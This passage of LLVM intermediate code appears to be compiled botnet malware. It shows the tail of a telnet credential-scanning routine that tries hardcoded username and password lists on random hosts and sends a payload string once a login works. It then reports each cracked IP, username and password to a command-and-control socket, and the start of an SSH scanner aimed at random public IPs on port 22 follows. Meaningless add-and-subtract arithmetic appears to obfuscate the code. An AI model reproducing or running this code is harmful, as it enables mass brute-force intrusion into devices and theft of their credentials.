  %2086 = load i32, i32* %2085, align 16
  %2087 = call i64 @send(i32 %2086, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.76, i32 0, i32 0), i64 49, i32 16384)
  %2088 = icmp slt i64 %2087, 0
  br i1 %2088, label %2089, label %2104

; <label>:2089:                                   ; preds = %2081
  %2090 = load i32, i32* %2, align 4
  %2091 = sext i32 %2090 to i64
  %2092 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2091
  %2093 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2092, i32 0, i32 0
  %2094 = load i32, i32* %2093, align 16
  %2095 = call i32 @sclose(i32 %2094)
  %2096 = load i32, i32* %2, align 4
  %2097 = sext i32 %2096 to i64
  %2098 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2097
  %2099 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2098, i32 0, i32 2
  store i8 0, i8* %2099, align 8
  %2100 = load i32, i32* %2, align 4
  %2101 = sext i32 %2100 to i64
  %2102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2101
  %2103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2102, i32 0, i32 3
  store i8 1, i8* %2103, align 1
  br label %2366

; <label>:2104:                                   ; preds = %2081
  %2105 = load i32, i32* %2, align 4
  %2106 = sext i32 %2105 to i64
  %2107 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2106
  %2108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2107, i32 0, i32 2
  store i8 12, i8* %2108, align 8
  br label %2109

; <label>:2109:                                   ; preds = %2104, %73
  %2110 = load i32, i32* %2, align 4
  %2111 = sext i32 %2110 to i64
  %2112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2111
  %2113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2112, i32 0, i32 6
  %2114 = load i32, i32* %2113, align 4
  %2115 = icmp eq i32 %2114, 0
  br i1 %2115, label %2116, label %2123

; <label>:2116:                                   ; preds = %2109
  %2117 = call i64 @time(i64* null) #2
  %2118 = trunc i64 %2117 to i32
  %2119 = load i32, i32* %2, align 4
  %2120 = sext i32 %2119 to i64
  %2121 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2120
  %2122 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2121, i32 0, i32 6
  store i32 %2118, i32* %2122, align 4
  br label %2123

; <label>:2123:                                   ; preds = %2116, %2109
  %2124 = load i32, i32* %2, align 4
  %2125 = sext i32 %2124 to i64
  %2126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2125
  %2127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2126, i32 0, i32 0
  %2128 = load i32, i32* %2127, align 16
  %2129 = load i32, i32* %2, align 4
  %2130 = sext i32 %2129 to i64
  %2131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2130
  %2132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2131, i32 0, i32 8
  %2133 = load i8*, i8** %2132, align 8
  %2134 = load i32, i32* %2, align 4
  %2135 = sext i32 %2134 to i64
  %2136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2135
  %2137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2136, i32 0, i32 7
  %2138 = load i16, i16* %2137, align 16
  %2139 = zext i16 %2138 to i32
  %2140 = call i32 @readUntil(i32 %2128, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.77, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %2133, i32 1024, i32 %2139)
  %2141 = icmp ne i32 %2140, 0
  br i1 %2141, label %2142, label %2183

; <label>:2142:                                   ; preds = %2123
  %2143 = load i32, i32* %2, align 4
  %2144 = sext i32 %2143 to i64
  %2145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2144
  %2146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2145, i32 0, i32 6
  store i32 0, i32* %2146, align 4
  %2147 = load i32, i32* %2, align 4
  %2148 = sext i32 %2147 to i64
  %2149 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2148
  %2150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2149, i32 0, i32 7
  store i16 0, i16* %2150, align 16
  %2151 = load i32, i32* %2, align 4
  %2152 = sext i32 %2151 to i64
  %2153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2152
  %2154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2153, i32 0, i32 0
  %2155 = load i32, i32* %2154, align 16
  %2156 = call i64 @send(i32 %2155, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), i64 394, i32 16384)
  %2157 = load i32, i32* @mainCommSock, align 4
  %2158 = load i32, i32* %2, align 4
  %2159 = sext i32 %2158 to i64
  %2160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2159
  %2161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2160, i32 0, i32 1
  %2162 = bitcast i32* %2161 to %struct.in_addr*
  %2163 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2162, i32 0, i32 0
  %2164 = load i32, i32* %2163, align 4
  %2165 = call i8* @inet_ntoa(i32 %2164) #2
  %2166 = load i32, i32* %2, align 4
  %2167 = sext i32 %2166 to i64
  %2168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2167
  %2169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2168, i32 0, i32 4
  %2170 = load i8, i8* %2169, align 2
  %2171 = zext i8 %2170 to i64
  %2172 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %2171
  %2173 = load i8*, i8** %2172, align 8
  %2174 = load i32, i32* %2, align 4
  %2175 = sext i32 %2174 to i64
  %2176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2175
  %2177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2176, i32 0, i32 5
  %2178 = load i8, i8* %2177, align 1
  %2179 = zext i8 %2178 to i64
  %2180 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2179
  %2181 = load i8*, i8** %2180, align 8
  %2182 = call i32 (i32, i8*, ...) @sockprintf(i32 %2157, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i32 0, i32 0), i8* %2165, i8* %2173, i8* %2181)
  br label %2366

; <label>:2183:                                   ; preds = %2123
  %2184 = load i32, i32* %2, align 4
  %2185 = sext i32 %2184 to i64
  %2186 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2185
  %2187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2186, i32 0, i32 0
  %2188 = load i32, i32* %2187, align 16
  %2189 = load i32, i32* %2, align 4
  %2190 = sext i32 %2189 to i64
  %2191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2190
  %2192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2191, i32 0, i32 8
  %2193 = load i8*, i8** %2192, align 8
  %2194 = load i32, i32* %2, align 4
  %2195 = sext i32 %2194 to i64
  %2196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2195
  %2197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2196, i32 0, i32 7
  %2198 = load i16, i16* %2197, align 16
  %2199 = zext i16 %2198 to i32
  %2200 = call i32 @readUntil(i32 %2188, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.78, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %2193, i32 1024, i32 %2199)
  %2201 = icmp ne i32 %2200, 0
  br i1 %2201, label %2202, label %2243

; <label>:2202:                                   ; preds = %2183
  %2203 = load i32, i32* %2, align 4
  %2204 = sext i32 %2203 to i64
  %2205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2204
  %2206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2205, i32 0, i32 6
  store i32 0, i32* %2206, align 4
  %2207 = load i32, i32* %2, align 4
  %2208 = sext i32 %2207 to i64
  %2209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2208
  %2210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2209, i32 0, i32 7
  store i16 0, i16* %2210, align 16
  %2211 = load i32, i32* %2, align 4
  %2212 = sext i32 %2211 to i64
  %2213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2212
  %2214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2213, i32 0, i32 0
  %2215 = load i32, i32* %2214, align 16
  %2216 = call i64 @send(i32 %2215, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), i64 394, i32 16384)
  %2217 = load i32, i32* @mainCommSock, align 4
  %2218 = load i32, i32* %2, align 4
  %2219 = sext i32 %2218 to i64
  %2220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2219
  %2221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2220, i32 0, i32 1
  %2222 = bitcast i32* %2221 to %struct.in_addr*
  %2223 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2222, i32 0, i32 0
  %2224 = load i32, i32* %2223, align 4
  %2225 = call i8* @inet_ntoa(i32 %2224) #2
  %2226 = load i32, i32* %2, align 4
  %2227 = sext i32 %2226 to i64
  %2228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2227
  %2229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2228, i32 0, i32 4
  %2230 = load i8, i8* %2229, align 2
  %2231 = zext i8 %2230 to i64
  %2232 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %2231
  %2233 = load i8*, i8** %2232, align 8
  %2234 = load i32, i32* %2, align 4
  %2235 = sext i32 %2234 to i64
  %2236 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2235
  %2237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2236, i32 0, i32 5
  %2238 = load i8, i8* %2237, align 1
  %2239 = zext i8 %2238 to i64
  %2240 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2239
  %2241 = load i8*, i8** %2240, align 8
  %2242 = call i32 (i32, i8*, ...) @sockprintf(i32 %2217, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i32 0, i32 0), i8* %2225, i8* %2233, i8* %2241)
  br label %2366

; <label>:2243:                                   ; preds = %2183
  %2244 = load i32, i32* %2, align 4
  %2245 = sext i32 %2244 to i64
  %2246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2245
  %2247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2246, i32 0, i32 0
  %2248 = load i32, i32* %2247, align 16
  %2249 = load i32, i32* %2, align 4
  %2250 = sext i32 %2249 to i64
  %2251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2250
  %2252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2251, i32 0, i32 8
  %2253 = load i8*, i8** %2252, align 8
  %2254 = load i32, i32* %2, align 4
  %2255 = sext i32 %2254 to i64
  %2256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2255
  %2257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2256, i32 0, i32 7
  %2258 = load i16, i16* %2257, align 16
  %2259 = zext i16 %2258 to i32
  %2260 = call i32 @readUntil(i32 %2248, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %2253, i32 1024, i32 %2259)
  %2261 = icmp ne i32 %2260, 0
  br i1 %2261, label %2262, label %2322

; <label>:2262:                                   ; preds = %2243
  %2263 = load i32, i32* %2, align 4
  %2264 = sext i32 %2263 to i64
  %2265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2264
  %2266 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2265, i32 0, i32 6
  store i32 0, i32* %2266, align 4
  %2267 = load i32, i32* %2, align 4
  %2268 = sext i32 %2267 to i64
  %2269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2268
  %2270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2269, i32 0, i32 7
  store i16 0, i16* %2270, align 16
  %2271 = load i32, i32* %2, align 4
  %2272 = sext i32 %2271 to i64
  %2273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2272
  %2274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2273, i32 0, i32 0
  %2275 = load i32, i32* %2274, align 16
  %2276 = call i64 @send(i32 %2275, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), i64 394, i32 16384)
  %2277 = load i32, i32* @mainCommSock, align 4
  %2278 = load i32, i32* %2, align 4
  %2279 = sext i32 %2278 to i64
  %2280 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2279
  %2281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2280, i32 0, i32 1
  %2282 = bitcast i32* %2281 to %struct.in_addr*
  %2283 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2282, i32 0, i32 0
  %2284 = load i32, i32* %2283, align 4
  %2285 = call i8* @inet_ntoa(i32 %2284) #2
  %2286 = load i32, i32* %2, align 4
  %2287 = sext i32 %2286 to i64
  %2288 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2287
  %2289 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2288, i32 0, i32 4
  %2290 = load i8, i8* %2289, align 2
  %2291 = zext i8 %2290 to i64
  %2292 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %2291
  %2293 = load i8*, i8** %2292, align 8
  %2294 = load i32, i32* %2, align 4
  %2295 = sext i32 %2294 to i64
  %2296 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2295
  %2297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2296, i32 0, i32 5
  %2298 = load i8, i8* %2297, align 1
  %2299 = zext i8 %2298 to i64
  %2300 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2299
  %2301 = load i8*, i8** %2300, align 8
  %2302 = call i32 (i32, i8*, ...) @sockprintf(i32 %2277, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i32 0, i32 0), i8* %2285, i8* %2293, i8* %2301)
  %2303 = load i32, i32* %2, align 4
  %2304 = sext i32 %2303 to i64
  %2305 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2304
  %2306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2305, i32 0, i32 8
  %2307 = load i8*, i8** %2306, align 8
  call void @llvm.memset.p0i8.i64(i8* %2307, i8 0, i64 1024, i32 1, i1 false)
  %2308 = load i32, i32* %2, align 4
  %2309 = sext i32 %2308 to i64
  %2310 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2309
  %2311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2310, i32 0, i32 0
  %2312 = load i32, i32* %2311, align 16
  %2313 = call i32 @sclose(i32 %2312)
  %2314 = load i32, i32* %2, align 4
  %2315 = sext i32 %2314 to i64
  %2316 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2315
  %2317 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2316, i32 0, i32 3
  store i8 1, i8* %2317, align 1
  %2318 = load i32, i32* %2, align 4
  %2319 = sext i32 %2318 to i64
  %2320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2319
  %2321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2320, i32 0, i32 2
  store i8 0, i8* %2321, align 8
  br label %2366

; <label>:2322:                                   ; preds = %2243
  %2323 = load i32, i32* %2, align 4
  %2324 = sext i32 %2323 to i64
  %2325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2324
  %2326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2325, i32 0, i32 8
  %2327 = load i8*, i8** %2326, align 8
  %2328 = call i64 @strlen(i8* %2327) #10
  %2329 = trunc i64 %2328 to i16
  %2330 = load i32, i32* %2, align 4
  %2331 = sext i32 %2330 to i64
  %2332 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2331
  %2333 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2332, i32 0, i32 7
  store i16 %2329, i16* %2333, align 16
  br label %2334

; <label>:2334:                                   ; preds = %2322
  br label %2335

; <label>:2335:                                   ; preds = %2334
  br label %2336

; <label>:2336:                                   ; preds = %2335
  %2337 = load i32, i32* %2, align 4
  %2338 = sext i32 %2337 to i64
  %2339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2338
  %2340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2339, i32 0, i32 6
  %2341 = load i32, i32* %2340, align 4
  %2342 = add i32 %2341, -1675141882
  %2343 = add i32 %2342, 10
  %2344 = sub i32 %2343, -1675141882
  %2345 = add i32 %2341, 10
  %2346 = zext i32 %2344 to i64
  %2347 = call i64 @time(i64* null) #2
  %2348 = icmp slt i64 %2346, %2347
  br i1 %2348, label %2349, label %2364

; <label>:2349:                                   ; preds = %2336
  %2350 = load i32, i32* %2, align 4
  %2351 = sext i32 %2350 to i64
  %2352 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2351
  %2353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2352, i32 0, i32 0
  %2354 = load i32, i32* %2353, align 16
  %2355 = call i32 @sclose(i32 %2354)
  %2356 = load i32, i32* %2, align 4
  %2357 = sext i32 %2356 to i64
  %2358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2357
  %2359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2358, i32 0, i32 2
  store i8 0, i8* %2359, align 8
  %2360 = load i32, i32* %2, align 4
  %2361 = sext i32 %2360 to i64
  %2362 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2361
  %2363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2362, i32 0, i32 3
  store i8 1, i8* %2363, align 1
  br label %2364

; <label>:2364:                                   ; preds = %2349, %2336
  br label %2365

; <label>:2365:                                   ; preds = %2364, %2070, %2039, %2011, %1983, %1959, %1250, %1186, %818, %754, %441, %256, %73
  br label %2366

; <label>:2366:                                   ; preds = %2365, %2262, %2202, %2142, %2089, %2024, %1996, %1968, %1913, %1888, %1847, %1822, %1781, %1756, %1715, %1690, %1649, %1624, %1583, %1558, %1517, %1492, %1451, %1426, %1398, %1357, %1332, %1304, %1235, %1212, %1131, %1108, %1085, %1062, %1039, %1016, %993, %970, %947, %933, %882, %803, %780, %706, %655, %604, %553, %502, %355, %194, %150
  %2367 = load i32, i32* %2, align 4
  %2368 = add i32 %2367, -1659262144
  %2369 = add i32 %2368, 1
  %2370 = sub i32 %2369, -1659262144
  %2371 = add nsw i32 %2367, 1
  store i32 %2370, i32* %2, align 4
  br label %69

; <label>:2372:                                   ; preds = %69
  br label %67
                                                  ; No predecessors!
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

declare i32 @system(i8*) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #4

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: noinline nounwind uwtable
define void @SSHScanner() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i8*, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = call i32 @getdtablesize() #2
  %15 = sdiv i32 %14, 4
  %16 = mul nsw i32 %15, 3
  store i32 %16, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  %18 = icmp sgt i32 %17, 512
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %0
  br label %22

; <label>:20:                                     ; preds = %0
  %21 = load i32, i32* %1, align 4
  br label %22

; <label>:22:                                     ; preds = %20, %19
  %23 = phi i32 [ 512, %19 ], [ %21, %20 ]
  store i32 %23, i32* %1, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = call zeroext i16 @htons(i16 zeroext 22) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %28 = getelementptr inbounds [8 x i8], [8 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %28, i8 0, i64 8, i32 4, i1 false)
  %29 = load i32, i32* %1, align 4
  %30 = zext i32 %29 to i64
  %31 = call i8* @llvm.stacksave()
  store i8* %31, i8** %9, align 8
  %32 = alloca %struct.telstate_t, i64 %30, align 16
  %33 = bitcast %struct.telstate_t* %32 to i8*
  %34 = load i32, i32* %1, align 4
  %35 = sext i32 %34 to i64
  %36 = mul i64 %35, 5
  call void @llvm.memset.p0i8.i64(i8* %33, i8 0, i64 %36, i32 16, i1 false)
  store i32 0, i32* %2, align 4
  br label %37

; <label>:37:                                     ; preds = %56, %22
  %38 = load i32, i32* %2, align 4
  %39 = load i32, i32* %1, align 4
  %40 = icmp slt i32 %38, %39
  br i1 %40, label %41, label %62

; <label>:41:                                     ; preds = %37
  %42 = load i32, i32* %2, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %43
  %45 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i32 0, i32 3
  store i8 1, i8* %45, align 1
  %46 = call noalias i8* @malloc(i64 1024) #2
  %47 = load i32, i32* %2, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %48
  %50 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i32 0, i32 8
  store i8* %46, i8** %50, align 8
  %51 = load i32, i32* %2, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %52
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %53, i32 0, i32 8
  %55 = load i8*, i8** %54, align 8
  call void @llvm.memset.p0i8.i64(i8* %55, i8 0, i64 1024, i32 1, i1 false)
  br label %56

; <label>:56:                                     ; preds = %41
  %57 = load i32, i32* %2, align 4
  %58 = sub i32 %57, 1307787333
  %59 = add i32 %58, 1
  %60 = add i32 %59, 1307787333
  %61 = add nsw i32 %57, 1
  store i32 %60, i32* %2, align 4
  br label %37

; <label>:62:                                     ; preds = %37
  %63 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 0
  store i64 5, i64* %63, align 8
  %64 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 1
  store i64 0, i64* %64, align 8
  br label %65

; <label>:65:                                     ; preds = %2321, %62
  br label %66

; <label>:66:                                     ; preds = %65
  store i32 0, i32* %2, align 4
  br label %67

; <label>:67:                                     ; preds = %2316, %66
  %68 = load i32, i32* %2, align 4
  %69 = load i32, i32* %1, align 4
  %70 = icmp slt i32 %68, %69
  br i1 %70, label %71, label %2321

; <label>:71:                                     ; preds = %67
  %72 = load i32, i32* %2, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %73
  %75 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i32 0, i32 2
  %76 = load i8, i8* %75, align 8
  %77 = zext i8 %76 to i32
  switch i32 %77, label %2315 [
    i32 0, label %78
    i32 1, label %244
    i32 2, label %431
    i32 3, label %745
    i32 4, label %813
    i32 5, label %1177
    i32 6, label %1245
    i32 7, label %1949
    i32 8, label %1977
    i32 9, label %2005
    i32 10, label %2059
  ]

; <label>:78:                                     ; preds = %71
  %79 = load i32, i32* %2, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %80
  %82 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %81, i32 0, i32 8
  %83 = load i8*, i8** %82, align 8
  call void @llvm.memset.p0i8.i64(i8* %83, i8 0, i64 1024, i32 1, i1 false)
  %84 = load i32, i32* %2, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %85
  %87 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %86, i32 0, i32 3
  %88 = load i8, i8* %87, align 1
  %89 = icmp ne i8 %88, 0
  br i1 %89, label %90, label %110

; <label>:90:                                     ; preds = %78
  %91 = load i32, i32* %2, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %92
  %94 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %93, i32 0, i32 8
  %95 = load i8*, i8** %94, align 8
  store i8* %95, i8** %11, align 8
  %96 = load i32, i32* %2, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %97
  %99 = bitcast %struct.telstate_t* %98 to i8*
  call void @llvm.memset.p0i8.i64(i8* %99, i8 0, i64 32, i32 16, i1 false)
  %100 = load i8*, i8** %11, align 8
  %101 = load i32, i32* %2, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %102
  %104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %103, i32 0, i32 8
  store i8* %100, i8** %104, align 8
  %105 = call i32 @getRandomPublicIP()
  %106 = load i32, i32* %2, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %107
  %109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %108, i32 0, i32 1
  store i32 %105, i32* %109, align 4
  br label %155

; <label>:110:                                    ; preds = %78
  %111 = load i32, i32* %2, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %112
  %114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %113, i32 0, i32 5
  %115 = load i8, i8* %114, align 1
  %116 = sub i8 0, 1
  %117 = sub i8 %115, %116
  %118 = add i8 %115, 1
  store i8 %117, i8* %114, align 1
  %119 = load i32, i32* %2, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %120
  %122 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %121, i32 0, i32 5
  %123 = load i8, i8* %122, align 1
  %124 = zext i8 %123 to i64
  %125 = icmp eq i64 %124, 13
  br i1 %125, label %126, label %141

; <label>:126:                                    ; preds = %110
  %127 = load i32, i32* %2, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %128
  %130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %129, i32 0, i32 5
  store i8 0, i8* %130, align 1
  %131 = load i32, i32* %2, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %132
  %134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %133, i32 0, i32 4
  %135 = load i8, i8* %134, align 2
  %136 = sub i8 0, %135
  %137 = sub i8 0, 1
  %138 = add i8 %136, %137
  %139 = sub i8 0, %138
  %140 = add i8 %135, 1
  store i8 %139, i8* %134, align 2
  br label %141

; <label>:141:                                    ; preds = %126, %110
  %142 = load i32, i32* %2, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %143
  %145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %144, i32 0, i32 4
  %146 = load i8, i8* %145, align 2
  %147 = zext i8 %146 to i64
  %148 = icmp eq i64 %147, 4
  br i1 %148, label %149, label %154

; <label>:149:                                    ; preds = %141
  %150 = load i32, i32* %2, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %151
  %153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %152, i32 0, i32 3
  store i8 1, i8* %153, align 1
  br label %2316

; <label>:154:                                    ; preds = %141
  br label %155

; <label>:155:                                    ; preds = %154, %90
  %156 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %156, align 4
  %157 = call zeroext i16 @htons(i16 zeroext 22) #13
  %158 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %157, i16* %158, align 2
